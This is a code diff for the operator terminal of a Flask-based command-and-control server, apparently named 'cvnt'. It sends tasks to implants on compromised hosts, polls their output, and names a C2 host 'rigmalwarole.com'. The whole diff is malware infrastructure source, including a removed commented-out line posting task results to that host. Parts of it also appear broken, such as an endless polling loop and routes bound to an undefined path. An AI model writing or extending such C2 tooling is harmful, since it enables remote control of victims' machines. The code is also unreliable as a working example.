@@ -1,4 +1,5 @@
-from cvnt.implant_pb2 import TaskRequest
+from time import sleep
+from cvnt.implant_pb2 import TaskRequest, TaskResponse
 from flask import Blueprint, session, render_template, redirect, url_for, jsonify
 from flask_wtf import FlaskForm 
 from wtforms import StringField, SubmitField 
@@ -8,7 +9,7 @@ from urllib.parse import urljoin
 from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
 from cvnt.constants import *
 from cvnt.database import db
-from cvnt.db_operations import make_task, get_list, get_implant_by_id
+from cvnt.db_operations import get_task_by_ids, make_task, get_list, get_implant_by_id
 
 term = Blueprint('terminal', __name__, template_folder='templates')
 c2 = "https://rigmalwarole.com"
@@ -26,16 +27,14 @@ class Terminal(FlaskForm):
 
 @term.route('/terminal', methods=['GET', 'POST'])
 def index():
+    response = ["Welcome to the party :)"]
     form = Terminal()
     if 'authenticated' not in session or not session['authenticated']:
         return redirect(url_for('basic.login_success'))
     implants = get_list()
     whole = None
-    rest_string = ' '
     if form.validate_on_submit():
         response = analyze_input(form)
-    else:
-        response = "Welcome to the party :)"
     return render_template('terminal.html', form=form, cmd=whole, implants=implants, response=response)
 
 # parses the command inputted into the terminal and handles server request
@@ -54,14 +53,22 @@ def analyze_input(form):
         rest_string = str(to_opcode(words[1]))
         if len(words) == 2:
             implant_id = words[0]
-            response = handle_task_request(implant_id, main_op, rest_string)
+            new_task = handle_task_request(implant_id, main_op, rest_string)
+            sleep(5)
+            response = new_task.task_output
+            response = response.split('\n')
         else:
             first_two_words = words[:2]
             implant_id = first_two_words[0]
             cmd = str(to_opcode(first_two_words[1]))
             rest_of_words = words[2:]
             rest_string = cmd + rest_string.join(rest_of_words)
-            response = handle_task_request(implant_id, main_op, rest_string)
+            new_task = handle_task_request(implant_id, main_op, rest_string)
+            while new_task.task_output is None:
+                sleep(5)
+            response = new_task.task_output
+            response = response.split('\n')
+            
     else:
         response = 'Invalid Command Loser :(' 
         cmd = ' '.join(words)
@@ -85,17 +92,12 @@ def handle_task_request(implant_id, cmd, args):
     print("added task")
     db.session.commit()
     print("committed task")
-    return "Slay baddie your command was recived successfully"
+    return new_task
 
 @term.route(response, methods=["POST"])
-def handle_t_response(implant_id, jobID, output):
+def handle_task_response(implant_id, TaskID, output):
     print(f'RESPONSE FROM CLIENT')
-    r = ClientTaskResponse()
-    r.ImplantID = implant_id
-    r.JobID = jobID
-    r.Output = output
-    out = r.SerializeToString()
-#    r = requests.post(urljoin( c2, response), data = out)
+    
 
 @term.route(response, methods=["POST"])
 def handle_packet(msg, csrf):
